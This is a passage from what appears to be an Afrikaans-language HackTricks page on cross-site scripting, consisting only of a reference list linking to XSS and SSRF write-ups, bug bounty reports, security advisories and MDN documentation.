- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Verwysings

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS en SSRF via die List-Unsubscribe SMTP Header in Horde Webmail en Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne-verslag #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [Van "Low-Impact" RXSS na Credential Stealer: 'n JS-in-JS stap-vir-stap gids](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust verander in 'n script loader + backend JS-konkatenering maak supply-chain stored XSS moontlik](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (onveilige Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
